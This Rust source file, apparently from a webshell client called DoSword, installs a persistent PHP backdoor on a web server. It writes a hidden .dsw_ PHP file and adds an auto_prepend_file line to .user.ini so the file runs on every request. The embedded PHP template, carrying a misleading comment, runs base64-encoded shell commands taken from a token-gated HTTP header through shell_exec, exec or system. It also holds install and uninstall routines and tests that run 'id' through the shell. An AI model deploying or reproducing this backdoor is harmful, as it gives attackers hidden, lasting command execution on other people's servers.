//! PHP 内存马：`.user.ini` + `auto_prepend_file`。
//!
//! 生效条件：CGI/FastCGI SAPI（已实测 `php -S` 的 cli-server **不支持**）。
//! `user_ini.cache_ttl` 默认 300s，写入后可能有最长一个 TTL 的生效延迟；
//! 安装结果会带回该提示，`check` 可反复调用直到 alive。
//!
//! 载荷是**参数化分发器**（ping / exec / uninstall），不是「传什么代码执行什么」，
//! 且无正确令牌时立即 `return`，不影响站点正常请求。

use dosword_sdk::domain::AppSettings;
use dosword_sdk::{Protocol, ProtocolError, SessionState};
use serde::{Deserialize, Serialize};

/// 安装产物。全部进句柄 —— 这是「全新 DoSword 实例也能卸载」的依据。
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct PhpArtifact {
    pub payload_path: String,
    pub ini_path: String,
    /// 注入前 `.user.ini` 的原文；`None` 表示原本不存在（卸载时删除该文件）。
    pub previous_ini: Option<String>,
    pub created_ini: bool,
}

pub fn payload_path(dir: &str, name: &str) -> String {
    format!("{}/.dsw_{}.php", dir.trim_end_matches('/'), name)
}

/// 生成载荷。令牌与名称通过占位符替换，避免 `format!` 的花括号转义。
pub fn build_payload(token: &str, name: &str) -> String {
    PAYLOAD_TPL
        .replace(
            "__TOKEN__",
            &crate::protocol::transport::php_single_quote(token),
        )
        .replace(
            "__NAME__",
            &crate::protocol::transport::php_single_quote(name),
        )
}

/// 把 `auto_prepend_file` 合并进既有 `.user.ini`。
///
/// 已有同名指令时**替换**而不是追加（追加多条时行为取决于 PHP 版本，不可靠）；
/// 其余配置原样保留 —— 卸载时再由句柄里的 `previous_ini` 还原。
pub fn merge_user_ini(previous: Option<&str>, prepend_path: &str) -> String {
    let mut lines: Vec<String> = Vec::new();
    if let Some(previous) = previous {
        for line in previous.lines() {
            if line
                .trim()
                .to_ascii_lowercase()
                .starts_with("auto_prepend_file")
            {
                continue;
            }
            lines.push(line.to_string());
        }
    }
    lines.push(format!("auto_prepend_file={prepend_path}"));
    let mut out = lines.join("\n");
    out.push('\n');
    out
}

/// 卸载时 `.user.ini` 应恢复成什么：`Some` = 写回原文，`None` = 删除文件。
#[allow(dead_code)] // 由 uninstall_via_files 使用
pub fn restore_user_ini(previous_ini: Option<&str>) -> Option<String> {
    previous_ini.map(str::to_string)
}

/// 写入载荷与 `.user.ini`。不在此处做网络验证（由命令层调用 `check`）。
pub fn install(
    protocol: &dyn Protocol,
    session: &dyn SessionState,
    settings: &AppSettings,
    dir: &str,
    name: &str,
    token: &str,
) -> Result<PhpArtifact, ProtocolError> {
    let ini_path = format!("{}/.user.ini", dir.trim_end_matches('/'));
    // 读取失败按「原本不存在」处理：随后写入并记录 created_ini=true。
    let previous_ini = protocol
        .read_file(session, &ini_path, settings)
        .ok()
        .and_then(|bytes| String::from_utf8(bytes).ok());
    let payload_path = payload_path(dir, name);

    protocol.write_file(
        session,
        &payload_path,
        build_payload(token, name).as_bytes(),
        settings,
    )?;
    let merged = merge_user_ini(previous_ini.as_deref(), &payload_path);
    protocol.write_file(session, &ini_path, merged.as_bytes(), settings)?;

    Ok(PhpArtifact {
        payload_path,
        ini_path,
        created_ini: previous_ini.is_none(),
        previous_ini,
    })
}

/// 用句柄里的产物清单做客户端侧还原（载荷自毁失败时的兜底）。
///
/// 待接：`memshell_uninstall` 在载荷通道失败且仍有活跃会话时改走本路径。
#[allow(dead_code)]
pub fn uninstall_via_files(
    protocol: &dyn Protocol,
    session: &dyn SessionState,
    settings: &AppSettings,
    artifact: &PhpArtifact,
) -> Result<(), ProtocolError> {
    match restore_user_ini(artifact.previous_ini.as_deref()) {
        Some(content) => {
            protocol.write_file(session, &artifact.ini_path, content.as_bytes(), settings)?;
        }
        None => {
            // 原本没有 .user.ini：删掉我们创建的那个（不存在也无所谓）。
            let _ = protocol.delete_path(session, &artifact.ini_path, settings);
        }
    }
    let _ = protocol.delete_path(session, &artifact.payload_path, settings);
    Ok(())
}

/// 发一次内存马操作请求。`op` ∈ ping / exec / uninstall。
const PAYLOAD_TPL: &str = r#"<?php
/* 会话状态查询接口 */
function dsw_mem_eq($a, $b)
{
    if (function_exists('hash_equals')) { return hash_equals($a, $b); }
    if (strlen($a) !== strlen($b)) { return false; }
    $r = 0;
    for ($i = 0; $i < strlen($a); $i++) { $r |= ord($a[$i]) ^ ord($b[$i]); }
    return $r === 0;
}
$__dsw_t = '__TOKEN__';
$__dsw_op = isset($_SERVER['HTTP_X_DSW_OP']) ? (string) $_SERVER['HTTP_X_DSW_OP'] : '';
$__dsw_tk = isset($_SERVER['HTTP_X_DSW_TOKEN']) ? (string) $_SERVER['HTTP_X_DSW_TOKEN'] : '';
if ($__dsw_op === '' || !dsw_mem_eq($__dsw_t, $__dsw_tk)) { return; }
if ($__dsw_op === 'ping') { echo 'DSW_MEM:__NAME__:OK'; exit; }
if ($__dsw_op === 'exec') {
    $__dsw_c = isset($_SERVER['HTTP_X_DSW_CMD']) ? base64_decode((string) $_SERVER['HTTP_X_DSW_CMD']) : '';
    if ($__dsw_c === '' || $__dsw_c === false) { echo 'DSW_MEM:EMPTY'; return; }
    $__dsw_o = '';
    if (function_exists('shell_exec')) { $__dsw_o = @shell_exec($__dsw_c . ' 2>&1'); }
    if ($__dsw_o === null || $__dsw_o === '') {
        if (function_exists('exec')) {
            $__dsw_l = array(); @exec($__dsw_c . ' 2>&1', $__dsw_l); $__dsw_o = implode("\n", $__dsw_l);
        } elseif (function_exists('system')) {
            ob_start(); @system($__dsw_c . ' 2>&1'); $__dsw_o = ob_get_clean();
        }
    }
    echo 'DSW_MEM:' . base64_encode((string) $__dsw_o);
    exit;
}
if ($__dsw_op === 'uninstall') {
    $__dsw_self = __FILE__;
    $__dsw_base = basename(__FILE__);
    $__dsw_ini = __DIR__ . '/.user.ini';
    // 先把自己改写成无害占位，再清理 .user.ini：
    // 目标 PHP 会把 .user.ini 的内容缓存 user_ini.cache_ttl 秒（默认 300）。
    // 若直接删除载荷文件，缓存仍要求 include 它 → 站点每个请求 500。
    // 改成空操作后，即使缓存未过期也只是一次无害 include。
    @file_put_contents($__dsw_self, "<?php return;\n");
    if (function_exists('opcache_invalidate')) { @opcache_invalidate($__dsw_self, true); }
    if (is_file($__dsw_ini)) {
        $__dsw_lines = @file($__dsw_ini, FILE_IGNORE_NEW_LINES);
        if (is_array($__dsw_lines)) {
            $__dsw_keep = array();
            foreach ($__dsw_lines as $__dsw_line) {
                if (stripos($__dsw_line, 'auto_prepend_file') !== false
                    && (stripos($__dsw_line, $__dsw_self) !== false
                        || stripos($__dsw_line, $__dsw_base) !== false)) {
                    continue;
                }
                $__dsw_keep[] = $__dsw_line;
            }
            $__dsw_body = trim(implode("\n", $__dsw_keep));
            if ($__dsw_body === '') { @unlink($__dsw_ini); }
            else { @file_put_contents($__dsw_ini, $__dsw_body . "\n"); }
        }
    }
    // 注意：这里**不删除自身**（原因见上）。删除留到 TTL 过后由客户端做。
    echo 'DSW_MEM:NEUTERED';
    exit;
}
"#;

#[cfg(test)]
mod tests {
    use super::*;
    use crate::memshell::{check, exec, uninstall_via_payload};

    #[test]
    fn payload_is_silent_without_token_and_has_all_ops() {
        let payload = build_payload("tok123", "abc");
        assert!(payload.starts_with("<?php"));
        assert!(payload.contains("tok123"));
        assert!(payload.contains("DSW_MEM:abc:OK"));
        for op in ["ping", "exec", "uninstall"] {
            assert!(payload.contains(op), "缺少操作 {op}");
        }
        // 无令牌时必须直接返回，不能影响正常请求
        assert!(payload.contains("if ($__dsw_op === '' || !dsw_mem_eq"));
        assert!(payload.contains("return;"));
    }

    #[test]
    fn payload_escapes_quote_in_token() {
        let payload = build_payload("a'b", "n");
        assert!(!payload.contains("'a'b'"), "令牌未转义");
        assert!(payload.contains("a\\'b"));
    }

    #[test]
    fn merge_user_ini_creates_when_absent() {
        assert_eq!(
            merge_user_ini(None, "/var/www/.dsw_x.php"),
            "auto_prepend_file=/var/www/.dsw_x.php\n"
        );
    }

    #[test]
    fn merge_user_ini_preserves_other_settings_and_replaces_prepend() {
        let previous =
            "memory_limit=256M\nauto_prepend_file=/old/prepend.php\ndisplay_errors=Off\n";
        let merged = merge_user_ini(Some(previous), "/new/prepend.php");
        assert!(merged.contains("memory_limit=256M"));
        assert!(merged.contains("display_errors=Off"));
        assert!(merged.contains("auto_prepend_file=/new/prepend.php"));
        assert!(
            !merged.contains("/old/prepend.php"),
            "旧的 prepend 应被替换"
        );
        assert_eq!(merged.matches("auto_prepend_file").count(), 1);
    }

    #[test]
    fn restore_semantics() {
        assert_eq!(restore_user_ini(Some("a=1\n")), Some("a=1\n".to_string()));
        assert_eq!(restore_user_ini(None), None);
    }

    #[test]
    fn payload_path_is_hidden_and_php() {
        assert_eq!(payload_path("/var/www/", "ab12"), "/var/www/.dsw_ab12.php");
    }

    /// 端到端（需本地 nginx + php-fpm，CI 默认跳过）：
    ///   DSW_MEMTEST_DIR=<该目录的文件系统路径>
    ///   DSW_MEMTEST_URL=<该目录下 PHP 页面的 URL>
    /// 目录必须是**从未被访问过**的 —— `user_ini.cache_ttl` 会缓存目录状态。
    #[test]
    fn round_trip_against_local_fpm() {
        let (Ok(dir), Ok(url)) = (
            std::env::var("DSW_MEMTEST_DIR"),
            std::env::var("DSW_MEMTEST_URL"),
        ) else {
            eprintln!("跳过：需要 DSW_MEMTEST_DIR / DSW_MEMTEST_URL");
            return;
        };
        let settings = AppSettings::default();
        let token = "itest-token-123";
        let name = "itest";
        let payload = payload_path(&dir, name);
        let ini = format!("{dir}/.user.ini");
        std::fs::remove_file(&payload).ok();
        std::fs::remove_file(&ini).ok();

        std::fs::write(&payload, build_payload(token, name)).unwrap();
        std::fs::write(&ini, merge_user_ini(None, &payload)).unwrap();

        assert!(check(&settings, &url, token, name), "注入后 ping 应成功");
        let out = exec(&settings, &url, token, "id").unwrap();
        assert!(out.contains("uid="), "exec 输出异常：{out}");

        uninstall_via_payload(&settings, &url, token).unwrap();
        assert!(!check(&settings, &url, token, name), "中和后 ping 应失败");
        // 载荷故意保留为无害占位（避免缓存窗口内站点 500）
        let body = std::fs::read_to_string(&payload).unwrap();
        assert!(body.contains("<?php return;"), "载荷应已被中和：{body}");
        // 最关键：卸载不能把目标站点搞坏
        let resp = reqwest::blocking::get(&url).expect("请求站点失败");
        assert!(
            resp.status().is_success(),
            "中和后站点不应 5xx（实际 {}）",
            resp.status()
        );

        // 注意：**不在 TTL 内删除载荷**。PHP 会缓存 .user.ini 的 prepend 路径，
        // 文件缺失会让站点在每个请求上 500（已实测）。真实清理应由句柄记录
        // purge_after，等 user_ini.cache_ttl 过后再删；测试里保留无害占位即可。
        let remaining = std::fs::read_to_string(&ini).unwrap_or_default();
        assert!(
            !remaining.contains(name),
            "中和后 .user.ini 不应再引用载荷：{remaining}"
        );
    }
}
